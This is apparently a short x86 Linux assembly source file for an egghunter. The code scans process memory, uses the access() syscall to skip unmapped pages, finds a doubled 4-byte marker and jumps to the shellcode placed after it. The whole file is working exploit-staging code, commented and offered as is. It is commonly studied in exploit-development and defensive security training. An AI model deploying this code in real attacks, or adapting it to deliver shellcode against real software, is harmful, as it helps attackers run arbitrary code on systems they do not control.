global _start
section .text
 
_start:
    xor edx, edx            
    xor ecx, ecx
 
next_page:
    or dx, 0xfff            ; align page address
 
next_address:
    inc edx                 ;  next address
    lea ebx, [edx+0x4]      ; for comparing [edx] and [edx+4] 
    push byte 0x21          ;  access()
    pop eax
    int 0x80                ; 
    cmp al, 0xf2            ; check for efault
    jz next_page              
    mov eax, 0x50905090     ; put egg in eax
    mov edi, edx            ; 
    scasd                   ; check if [edi] == eax then increment edi
    jnz next_address             
    scasd                   ; check if [edi] == eax then increment edi
    jnz next_address         
    jmp edi                 ; egg found; jump to shellcode